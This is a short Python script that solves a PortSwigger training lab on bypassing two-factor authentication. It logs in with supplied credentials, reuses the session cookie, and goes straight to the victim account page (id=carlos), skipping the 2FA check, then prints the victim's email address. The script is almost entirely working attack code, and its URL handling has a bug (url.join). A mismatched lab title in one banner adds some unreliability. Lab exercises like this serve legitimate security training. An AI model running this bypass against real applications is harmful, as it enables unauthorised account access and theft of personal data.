from requests import request
from sys import argv

def pwn(url,username,password):
    
    print("""
    0xCrypt00o Solution for Portswigger LAB : 2FA simple bypass
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
    
    if url[-1]!='/':
        url=url.join('/')
    
    print('[+] GET /Login')
    
    res=request(url=url+'login',method='GET')
    
    cookie=res.headers.get('Set-Cookie').split(';')[0]
    
    data='username='+username+'&password='+password
    
    print("[+] POST /login")
    
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookie})
    
    if res.history:
        cookie=res.history[0].headers.get('Set-Cookie').split(';')[0]
    
    print("[+] GET account?id=carlos")
    
    res=request(url=url+'my-account?id=carlos',method='GET',headers={'Cookie':cookie})
    
    print("[+] Getting Used Info")
    
    content=res.content.decode()
    emailStartIndex=content.index('Your email is:')
    print(content[emailStartIndex:-1].split("</p>")[0])
    
    return res


if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : 2FA broken logic
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     pwn(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-2fa-simple-bypass.py <url> <username> <password> ")
